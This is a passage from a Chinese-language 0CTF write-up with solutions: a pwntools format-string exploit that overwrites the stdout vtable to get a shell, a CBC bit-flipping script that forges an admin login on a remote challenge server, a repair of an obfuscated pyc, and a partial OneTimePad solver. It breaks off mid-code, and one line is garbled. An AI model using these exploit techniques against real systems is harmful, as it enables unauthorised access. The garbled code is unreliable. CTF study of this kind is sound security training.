    libc = ELF('./libc.so.6')
#raw_input('go?')
io.recvuntil('Which address you wanna read:\n')
io.sendline('134520900')
stdout_addr = int(io.recvuntil('\n')[:-1], 16)
vtable_addr = stdout_addr + 0x94
system_addr = stdout_addr - (libc.symbols['_IO_2_1_stdout_'] - libc.symbols['system'
])
log.info('stdout_addr:%#x' % stdout_addr)
log.info('system_addr:%#x' % system_addr)
content = {
    vtable_addr: vtable_addr,
    vtable_addr + 28: system_addr,
    stdout_addr: u32('sh\x00\x00')
}
payload = fmtstr_payload(7, content)
io.recvuntil('Good Bye\n')
io.sendline(payload)
io.interactive()
0CTF-Writeup
6/22
Integrity
唯一会的一道密码学....
首先审计源码。得知要以 admin 用户登录就能得到flag，但是却不能注册 admin 用户。
使用的是AES CBC进行加解密。16byte进行分块，需要解密数据的格式是 iv + 密文 ，
而密文解密出来是16byte的签名+明文
iv可控，所以通过CBC比特反转攻击签名可控，所以只要构造明文为 admin + pad 就行
了
注册用户 'admin' + "\x0b" + "xxxxx"
得到的数据的格式是
删掉最后16byte, 在通过控制iv来控制checksum, 然后得到的密文进行登录，得到的就
是 admin 用户
payload:
16byte iv
16byte checksum
16byte admin+'\x0b'
16byte xxxxx + '\x0b'
Integrity
7/22
Misc
py
题目给了一个坏掉的pyc文件，没法用现有的库还原出源码
使用 marshal 模块查看pyc的结构信息
使用 dis 模块反编译下加解密和主模块的 co_code ，发现出现了一些无法解析的值
import hashlib
from pwn import *
BS = 16
def str_xor(x, y):
 return "".join([chr(ord(x[i])^ord(y[i])) for i in xrange(16)])
def main():
 payload = "admin"+"\x0b"*0xb+"xxxxx"
 p = remote("202.120.7.217", 8221)
 p.recvuntil("ogin")
 p.sendline("r")
 p.sendline(payload)
 p.recvuntil("secret:\n")
 ct = p.recvuntil("\n").strip().decode('hex')
 IV = ct[:BS]
 plain = "admin"+"\x0b"*0xb+"xxxxx"+"\x0b"*0xb
 pmd5 = hashlib.md5(plain).digest()
 admin = "admin"+"\x0b"*0xb
 checksum = hashlib.md5(admin).digest()
 cipher = str_xor(str_xor(IV, pmd5), checksum)
 p.sendline("l")
 p.sendline(cipher.encode("hex")+ct[BS:BS+32].encode('hex'))
 p.interactive()
main()
Misc
8/22
比如153,39, 在python2.7中这些值没有对应的opcode
参考:https://github.com/python/cpython/blob/2.7/Include/opcode.h
所以尝试人工进行修复
发现一个全局变量 rotor , 不属于代码中定义的函数，猜测是 import rotor 进来
的，google了一下这个模块的用法: https://docs.python.org/2.0/lib/module-rotor.html
之前发现加解密函数的co_code几乎一样，但是通过局部变量发现 co_names :
dis.dis(decrypt.co_code)
          0                1
          3 BUILD_SET           1          
          6                2
          9 BUILD_SET           2
         12                3
         15 BUILD_SET           3
         18 STORE_GLOBAL        1 (1)
         21                4
         24 PRINT_EXPR     
         25                5
         28            
         29 STORE_GLOBAL        2 (2)
         32 STORE_GLOBAL        1 (1)
         35            
         36 STORE_GLOBAL        3 (3)
         39            
         40                6
         43 PRINT_EXPR     
         44            
         45                5
         48            
         49 STORE_GLOBAL        2 (2)
         52                6
         55 PRINT_EXPR     
         56            
         57                7
         60            
         61 BUILD_SET           4
         64                0
         67 DELETE_ATTR         1 (1)
         70 STORE_GLOBAL        4 (4)
         73 CALL_FUNCTION       1
         76 BUILD_SET           5
         79 STORE_GLOBAL        5 (5)
         82 DELETE_ATTR         2 (2)
         85 STORE_GLOBAL        0 (0)
         88 CALL_FUNCTION       1
         91 RETURN_VALUE   
decrypt.co_names
('rotor', 'newrotor', 'decrypt')
encrypt.co_names
('rotor', 'newrotor', 'encrypt')
Misc
9/22
所以猜测区别是:
所以猜测了下解密函数的co_code代码:
所以现在要想办法还原出如何得到的变量 secret
对应的co_code:
猜测了下，co_code可能使用替代法来进行混淆，比如，把 LOAD_CONST 指令全部替换成
153, 上下部分都能猜出大概的指令, 参考: https://docs.python.org/2/library/dis.html
decrypt:
 rot = rotor.newrotor(secret)
 return rot.decrypt(rot)
encrypt:
 rot = rotor.newrotor(secret)
 return rot.encrypt(rot)
def decrypt(data):
 key_a = '!@#$%^&*'
 key_b = 'abcdefgh'
 key_c = '<>{}:"'
 secret = 某些操作
 rot = rotor.newrotor(secret)
 return rot.decrypt(rot)
         18 STORE_GLOBAL        1 (1)
         21                4
         24 PRINT_EXPR     
         25                5
         28            
         29 STORE_GLOBAL        2 (2)
         32 STORE_GLOBAL        1 (1)
         35            
         36 STORE_GLOBAL        3 (3)
         39            
         40                6
         43 PRINT_EXPR     
         44            
         45                5
         48            
         49 STORE_GLOBAL        2 (2)
         52                6
         55 PRINT_EXPR     
         56            
         57                7
         60            
         61 BUILD_SET           4
Misc
10/22
替换后得到:
得到代码:
字符串与字符串之间的操作OP2猜测为字符串拼接 +
OP1就有好几种可能了，比如:
四种可能一个一个去试:
         18 LOAD_FAST           1(key_a)
         21 LOAD_CONST          4(4)
         24 PRINT_EXPR     
         25 LOAD_CONST          5('|')
         28            
         29 LOAD_FAST           2(key_b)
         32 LOAD_FAST           1(key_a)
         35            
         36 LOAD_FAST           3(key_c)
         39            
         40 LOAD_CONST          6(2)
         43 PRINT_EXPR     
         44            
         45 LOAD_CONST          5('|')
         48            
         49 LOAD_FAST           2(key_b)
         52 LOAD_CONST          6(2)
         55 PRINT_EXPR     
         56            
         57 LOAD_CONST          7('EOF')
         60            
         61 STORE_FAST          4(secret)
secret = key_a OP1 4 OP2 "|" OP2 (key_b OP2 key_a OP2 key_c) OP1 2 OP2 "|" + key_b O
P1 2 OP2 "EOF"
key_a[4]
key_a[:4]
key_a[4:]
key_a*4
def decrypt(data):
 key_a = "!@#$%^&*"
 key_b = "abcdefgh"
 key_c = '<>{}:"'
    secret=key_a*4 + "|" + (key_b+key_a+key_c)*2 + "|" + key_b*2 + "EOF"
    # secret=key_a[4] + "|" + (key_b+key_a+key_c)[2] + "|" + key_b[2] + "EOF"
    # secret=key_a[4:] + "|" + (key_b+key_a+key_c)[2:] + "|" + key_b[2:] + "EOF"
    # secret=key_a[:4] + "|" + (key_b+key_a+key_c)[:2] + "|" + key_b[:2] + "EOF"
 rot = rotor.newrotor(secret)
    return rot.decrypt(data)
Misc
11/22
最后当OP1为 * 时可以成解出flag
Crypto:
OneTimePad
这题原理没搞懂，只是发现一个特性, process传入结果和key，循环255次可以得到
seed
payload:
Crypto:
12/22
Re
#!/usr/bin/env python
# coding=utf-8
from os import urandom
def process(m, k):
    tmp = m ^ k
    res = 0
    # print "tmp:{%s}"%tmp
    for i in bin(tmp)[2:]:
        # print i
        res = res > 256):
            res = res ^ P
    return res
def keygen(seed):
    key = str2num(urandom(32))